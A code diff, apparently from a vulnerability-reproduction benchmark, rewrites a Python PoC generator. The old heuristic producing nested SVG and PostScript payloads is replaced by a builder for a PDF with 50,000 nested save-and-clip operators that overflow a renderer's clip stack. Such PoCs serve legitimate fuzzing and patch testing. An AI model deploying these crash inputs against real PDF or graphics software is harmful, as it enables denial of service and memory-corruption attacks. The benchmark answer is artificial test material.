@@ -1,60 +1,73 @@
-import os
+import sys
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
-        Generate a PoC that triggers the vulnerability.
+        Generate a PoC that triggers the Heap Buffer Overflow vulnerability in the clip stack.
+        The vulnerability allows the nesting depth to step outside the layer/clip stack
+        when pushing a clip mark.
         
-        The vulnerability "nesting depth is not checked before pushing a clip mark" 
-        strongly suggests a stack overflow or heap buffer overflow in a graphics state stack
-        (like Ghostscript's gstate stack or Skia's save/clip stack).
+        The ground truth size (~913KB) suggests a linear expansion of commands in a format
+        that doesn't support tight loops for this operation (like PDF content streams) or
+        where the vulnerability is specific to the parser's linear processing.
         
-        We scan the source path to identify the library and generate an appropriate 
-        deeply nested input.
+        We construct a valid PDF with a content stream containing approximately 50,000
+        nested clip operations.
         """
         
-        target = "ghostscript" # Default to Ghostscript as "clip mark" is specific terminology there
+        # Number of nested operations.
+        # "q 0 0 1 1 re W n " is 19 bytes.
+        # 50,000 * 19 = 950,000 bytes, which is close to the ground truth of 913,919 bytes.
+        # This depth should be sufficient to overflow typical stack/buffer limits (e.g., 65536).
+        num_ops = 50000
         
-        # Heuristic detection
-        for root, dirs, files in os.walk(src_path):
-            lower_root = root.lower()
-            if 'skia' in lower_root or 'skcanvas.cpp' in [f.lower() for f in files]:
-                target = "skia"
-                break
-            if 'mupdf' in lower_root or 'fitz.h' in files:
-                target = "mupdf"
-                break
-            if 'ghostscript' in lower_root or 'gsmain.c' in files or 'psi' in dirs:
-                target = "ghostscript"
-                break
+        # PDF Header
+        header = b"%PDF-1.4\n"
         
-        if target == "skia":
-            # Skia: Trigger nesting depth issues via SVG <g> nesting
-            # Skia's SVG parser pushes state for each group.
-            # 50,000 depth ensures we exceed typical stack limits/buffer sizes.
-            depth = 50000
-            payload = b'<svg xmlns="http://www.w3.org/2000/svg">'
-            payload += b"<g>" * depth
-            payload += b"</g>" * depth
-            payload += b"</svg>"
-            return payload
-            
-        elif target == "mupdf":
-            # MuPDF: Also susceptible to deep nesting in structured formats like SVG
-            depth = 50000
-            payload = b'<svg xmlns="http://www.w3.org/2000/svg">'
-            payload += b"<g>" * depth
-            payload += b"</g>" * depth
-            payload += b"</svg>"
-            return payload
-            
-        else:
-            # Ghostscript: Trigger gstate stack overflow
-            # `gsave` pushes the current graphics state (including clip path) onto the stack.
-            # Repeated `gsave` without `grestore` increases stack depth.
-            # If the check is missing, this causes a heap buffer overflow.
-            # We use 100,000 iterations to generate a substantial file (~600KB) 
-            # which is close to the ground truth magnitude but likely efficient enough.
-            count = 100000
-            payload = b"%!PS\n" + b"gsave " * count
-            return payload
+        # Object 1: Catalog
+        obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
+        
+        # Object 2: Pages
+        obj2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
+        
+        # Object 3: Page
+        # Links to Content Stream (Obj 4)
+        obj3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Contents 4 0 R >>\nendobj\n"
+        
+        # Object 4: Content Stream
+        # The payload repeats the sequence:
+        # q  : Save graphics state (pushes to state stack)
+        # 0 0 1 1 re : Append a 1x1 rectangle at (0,0) to the path
+        # W  : Clip (intersect current clip with path)
+        # n  : End path (no stroke/fill)
+        # This sequence effectively pushes a new complex clip path onto the stack repeatedly.
+        op_sequence = b"q 0 0 1 1 re W n "
+        stream_data = op_sequence * num_ops
+        
+        obj4_start = b"4 0 obj\n<< /Length " + str(len(stream_data)).encode() + b" >>\nstream\n"
+        obj4_end = b"\nendstream\nendobj\n"
+        obj4 = obj4_start + stream_data + obj4_end
+        
+        # Construct body to calculate offsets
+        body = header + obj1 + obj2 + obj3 + obj4
+        
+        # Cross-reference table
+        xref_offset = len(body)
+        xref = b"xref\n0 5\n0000000000 65535 f \n"
+        
+        # Calculate object offsets
+        off1 = len(header)
+        off2 = off1 + len(obj1)
+        off3 = off2 + len(obj2)
+        off4 = off3 + len(obj3)
+        
+        # Format offsets as 10-digit integers
+        xref += b"%010d 00000 n \n" % off1
+        xref += b"%010d 00000 n \n" % off2
+        xref += b"%010d 00000 n \n" % off3
+        xref += b"%010d 00000 n \n" % off4
+        
+        # Trailer
+        trailer = b"trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n%d\n%%EOF" % xref_offset
+        
+        return body + xref + trailer
